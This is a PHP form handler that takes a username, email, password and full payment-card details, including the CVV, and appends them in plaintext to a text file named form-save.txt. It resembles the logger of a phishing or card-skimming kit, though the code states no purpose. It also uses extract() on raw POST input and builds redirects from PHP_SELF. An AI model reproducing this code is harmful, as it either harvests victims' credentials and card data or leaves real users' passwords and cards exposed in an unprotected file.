<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Ensure that the required fields are set
    if (
        isset($_POST["username"]) && isset($_POST["email"]) &&
        isset($_POST["password"]) && isset($_POST["cardholderName"]) &&
        isset($_POST["cardNumber"]) && isset($_POST["expiryDate"]) &&
        isset($_POST["cvv"]) && isset($_POST["amount"]) &&
        isset($_POST["paymentMethod"])
    ) {
        // Extract form data
        extract($_POST);

        // Sanitize and validate input (you can add more validation as needed)
        $username = htmlspecialchars(trim($username));
        $email = filter_var(trim($email), FILTER_VALIDATE_EMAIL);
        $password = htmlspecialchars(trim($password));
        $cardholderName = htmlspecialchars(trim($cardholderName));
        $cardNumber = htmlspecialchars(trim($cardNumber));
        $expiryDate = htmlspecialchars(trim($expiryDate));
        $cvv = htmlspecialchars(trim($cvv));
        $amount = floatval($_POST["amount"]); // Assuming it's a numeric value
        $paymentMethod = htmlspecialchars(trim($paymentMethod));

        // Check if all required fields are valid
        if (
            $username !== "" && $email !== false && $password !== "" &&
            $cardholderName !== "" && $cardNumber !== "" &&
            $expiryDate !== "" && $cvv !== "" && $amount > 0 &&
            ($paymentMethod === "creditCard" || $paymentMethod === "debitCard")
        ) {
            // Open file in append mode
            $file = fopen("form-save.txt", "a");

            // Write form data to the file
            fwrite($file, "Name: " . $username . "\n");
            fwrite($file, "Email: " . $email . "\n");
            fwrite($file, "Password: " . $password . "\n");
            fwrite($file, "Cardholder Name: " . $cardholderName . "\n");
            fwrite($file, "Card Number: " . $cardNumber . "\n");
            fwrite($file, "Expiry Date: " . $expiryDate . "\n");
            fwrite($file, "CVV: " . $cvv . "\n");
            fwrite($file, "Amount: " . $amount . "\n");
            fwrite($file, "Payment Method: " . $paymentMethod . "\n");

            // Close the file
            fclose($file);

            // Redirect to the same page
            header("location: {$_SERVER['PHP_SELF']}?success=true");
            exit();
        }
    }
}

// If the form data is not valid or if the request method is not POST, redirect to the same page with an error flag
header("location: {$_SERVER['PHP_SELF']}?error=true");
exit();
?>
